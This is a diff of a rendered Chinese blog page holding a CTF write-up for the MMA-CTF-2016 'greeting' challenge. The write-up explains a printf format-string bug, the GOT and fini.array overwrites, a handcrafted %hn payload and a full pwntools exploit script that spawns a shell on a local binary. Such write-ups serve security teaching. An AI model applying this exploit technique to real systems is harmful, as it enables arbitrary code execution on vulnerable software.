@@ -12,24 +12,24 @@
 <li>可以利用<code>printf</code>将<code>fini.array</code>数组中的第一个元素覆盖为<code>main</code>函数的地址，或者<code>_start</code>函数的地址，可以循环运行<code>main</code>函数。本题只能多循环利用1次，之后就会报错。因为<code>fini.array</code>段的只有一个指针大小。</li>
 </ul>
 <span id="more"></span>
-<h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><h4 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h4><p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210228162702.png"></p>
+<h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><h4 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h4><p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210228162702.png" alt=""></p>
 <h4 id="函数分析"><a href="#函数分析" class="headerlink" title="函数分析"></a>函数分析</h4><ul>
 <li><p>main：</p>
-<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210228162758.png"></p>
+<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210228162758.png" alt=""></p>
 <p><code>main</code>函数中，首先接收<code>stdin</code>的输入，最多输入<code>64</code>个字符，然后将输入的内容进行拼接，拼接后直接<code>printf</code>打印。</p>
 </li>
 <li><p>getnline：</p>
-<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210228164153.png"></p>
+<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210228164153.png" alt=""></p>
 <p>就是普通的读取输入的函数。注意，这里调用了<code>fgets</code>，<code>strchr</code>，<code>strlen</code>函数。</p>
 </li>
 </ul>
 <h4 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h4><p>很明显，格式化字符串漏洞。不过在查看文件，发现调用过<code>system</code>函数。同时<code>got</code>可读可写，所以考虑将某个函数的<code>got</code>表写为<code>system@plt</code>。然后想办法调用<code>/bin/sh</code>。</p>
 <p>这里有个问题，就是<code>printf</code>打印完后，直接结束程序运行。那么，基本是没有办法通过一次格式化漏洞就获取<code>shell</code>的，要想覆盖<code>eip</code>就得泄露栈地址，不可能一边泄露栈地址一边往栈地址上写。因此，需要研究一下，怎样能够让程序能再一次回到<code>main</code>函数。</p>
 <h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p><code>main</code>函数并不是程序运行的起点，我们知道在<code>__libc_start_main</code>函数中调用了<code>main</code>函数。网上有一些资料，解析<code>x86</code>程序运行的初始化函数执行流，详情请见<a target="_blank" rel="noopener" href="http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html">这个地址</a>。这里，只拿出一张图分析：</p>
-<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/init.jpg"></p>
+<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/init.jpg" alt=""></p>
 <p>可以看到，<code>_start</code>函数中，调用了<code>__libc_start_main</code>，然后调用<code>main</code>函数。初始化的时候，调用<code>init.array</code>数组中的函数指针，退出的时候，调用<code>fini.array</code>数组的函数指针。因此，我们只需要把<code>fini.array</code>的第一个元素覆盖为<code>main</code>或者<code>_start</code>函数的地址即可。</p>
 <p>在<code>IDA</code>中按下<code>ctrl + S</code>，可以看到程序段：</p>
-<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210228164036.png"></p>
+<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210228164036.png" alt=""></p>
 <p>地址为<code>0x8049934</code>。</p>
 <h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>步骤：</p>
 <ul>
@@ -38,36 +38,34 @@
 </ul>
 <h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>一开始用<code>fmtstr_payload</code>生成<code>payload</code>，长度为<code>70</code>，超过了<code>64</code>。因此，手动写一下。</p>
 <p>首先观察一下，正常情况下，<code>0x8049934</code>处的值是多少：</p>
-<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210228164657.png"></p>
+<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210228164657.png" alt=""></p>
 <p>我们要改写为<code>0x80484f0</code>，不难发现，只需要改写低两个字节即可。高两个字节保持为<code>0x0804</code>不动。</p>
 <p>准备手动写<code>payload</code>。这里先测一下偏移，输入：<code>aaaa%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x</code></p>
 <p>输出为：</p>
-<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210228165018.png"></p>
+<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210228165018.png" alt=""></p>
 <p>好像<code>aaaa</code>被分开输出了，说明前面有2位的偏移，于是，修改输入为：<code>bbaaaa%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x</code></p>
 <p>再来一次：</p>
-<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210228165148.png"></p>
-<p>计算一下偏移，<code>offset = 12</code>。注意，前面有两个<code>a</code>，还有一句<code>Nice to meet you, </code>，也就是说，前面已经输出了<code>0x14</code>个字符。</p>
+<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210228165148.png" alt=""></p>
+<p>计算一下偏移，<code>offset = 12</code>。注意，前面有两个<code>a</code>，还有一句<code>Nice to meet you,</code>，也就是说，前面已经输出了<code>0x14</code>个字符。</p>
 <p>直接使用<code>%n</code>写四个字节容易写失败，这里使用<code>$hn</code>两个字节依次写入。本次要往<code>str@got(0x8049a54)</code>写入为<code>system@plt(0x8048490)</code>，然后将<code>fini.array(0x8049934)</code>的低两个字节写为<code>0x84f0</code>根据要格式化字符串要写的内容，对写的字节大小排个序：</p>
 <blockquote>
 <p>本次写入，要达到的目的为：</p>
-<p>往<code>0x8049a56</code> ——&gt; <code>0x0804</code></p>
-<p>往<code>0x8049a54</code> ——&gt; <code>0x8490</code></p>
-<p>往<code>0x8049934</code> ——&gt; <code>0x84f0</code></p>
+<p>往<code>0x8049a56</code> ———&gt; <code>0x0804</code></p>
+<p>往<code>0x8049a54</code> ———&gt; <code>0x8490</code></p>
+<p>往<code>0x8049934</code> ———&gt; <code>0x84f0</code></p>
 </blockquote>
 <p>最后结合偏移量，最终的<code>payload</code>为：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;aa&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%2032c%21$hn&#x27;</span> + <span class="string">b&#x27;%31884c%22$hn&#x27;</span> + <span class="string">b&#x27;%96c%23$hna&#x27;</span> + p32(<span class="number">0x8049a56</span>) + p32(<span class="number">0x8049a54</span>) + p32(<span class="number">0x8049934</span>)</span><br></pre></td></tr></table></figure>
-
 <p>然后调试一下，看看是不是都改对了：</p>
 <p>修改前：</p>
-<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210228170509.png"></p>
+<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210228170509.png" alt=""></p>
 <p>修改后：</p>
-<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210228170902.png"></p>
+<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210228170902.png" alt=""></p>
 <p>此时，获得了第二次输入机会：</p>
-<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210228171120.png"></p>
+<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210228171120.png" alt=""></p>
 <p>输入<code>/bin/dash</code>即可得到<code>shell</code>。</p>
-<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210228171225.png"></p>
+<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210228171225.png" alt=""></p>
 <h4 id="完整Exp"><a href="#完整Exp" class="headerlink" title="完整Exp"></a>完整Exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./greeting&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;aa&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%2032c%21$hn&#x27;</span> + <span class="string">b&#x27;%31884c%22$hn&#x27;</span> + <span class="string">b&#x27;%96c%23$hna&#x27;</span> + p32(<span class="number">0x8049a56</span>) + p32(<span class="number">0x8049a54</span>) + p32(<span class="number">0x8049934</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Please tell me your name... &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(payload, <span class="built_in">len</span>(payload))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Please tell me your name... &quot;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
 </div><div class="article-licensing box"><div class="licensing-title"><p>MMA-CTF-2nd-2016-greeting</p><p><a href="https://roderickchan.github.io/2021/03/28/MMA-CTF-2nd-2016-greeting/">https://roderickchan.github.io/2021/03/28/MMA-CTF-2nd-2016-greeting/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>作者</h6><p>乐乐</p></div></div><div class="level-item is-narrow"><div><h6>发布于</h6><p>2021-03-28</p></div></div><div class="level-item is-narrow"><div><h6>更新于</h6><p>2021-05-06</p></div></div><div class="level-item is-narrow"><div><h6>许可协议</h6><p><a class="icon" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a><a class="icon" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a><a class="icon" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/pwn/">pwn</a><a class="link-muted mr-2" rel="tag" href="/tags/printf-attack/">printf attack</a><a class="link-muted mr-2" rel="tag" href="/tags/fini-array/">fini.array</a></div><div class="sharethis-inline-share-buttons"></div><script src="https://platform-api.sharethis.com/js/sharethis.js#property=606007929c00ae0011d418d7&amp;product=inline-share-buttons" defer></script></article></div><div class="card"><div class="card-content"><h3 class="menu-label has-text-centered">喜欢这篇文章？打赏一下作者吧</h3><div class="buttons is-centered"><a class="button donate" data-type="alipay"><span class="icon is-small"><i class="fab fa-alipay"></i></span><span>支付宝</span><span class="qrcode"><img src="/img/alipay.jpg" alt="支付宝"></span></a><a class="button donate" data-type="wechat"><span class="icon is-small"><i class="fab fa-weixin"></i></span><span>微信</span><span class="qrcode"><img src="/img/wechat.png" alt="微信"></span></a></div></div></div><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2021/03/28/roarctf-2019-realloc-magic/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">roarctf_2019_realloc_magic</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2021/03/28/CISCN-2018-Quals-note-service2/"><span class="level-item">CISCN-2018-Quals-note-service2</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">评论</h3><div class="content" id="valine-thread"></div><script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="https://cdnjs.loli.net/ajax/libs/valine/1.4.14/Valine.min.js"></script><script>new Valine({
             el: '#valine-thread' ,
             appId: "Cm6SOyxcRow2ynGlFReSz3y4-gzGzoHsz",
@@ -128,10 +126,22 @@
                 }
                 $('.justified-gallery').justifiedGallery();
             }
-        });</script><!--!--><!--!--><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/KaTeX/0.11.1/katex.min.css"><script src="https://cdnjs.loli.net/ajax/libs/KaTeX/0.11.1/katex.min.js" defer></script><script src="https://cdnjs.loli.net/ajax/libs/KaTeX/0.11.1/contrib/auto-render.min.js" defer></script><script src="https://cdnjs.loli.net/ajax/libs/KaTeX/0.11.1/contrib/mhchem.js" defer></script><script>window.addEventListener("load", function() {
-            document.querySelectorAll('[role="article"] > .content').forEach(function(element) {
-                renderMathInElement(element);
-            });
-        });</script><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
+        });</script><!--!--><!--!--><script type="text/x-mathjax-config">MathJax.Hub.Config({
+            'HTML-CSS': {
+                matchFontHeight: false
+            },
+            SVG: {
+                matchFontHeight: false
+            },
+            CommonHTML: {
+                matchFontHeight: false
+            },
+            tex2jax: {
+                inlineMath: [
+                    ['$','$'],
+                    ['\\(','\\)']
+                ]
+            }
+        });</script><script src="https://cdnjs.loli.net/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" defer></script><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
             loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
         });</script></body></html>
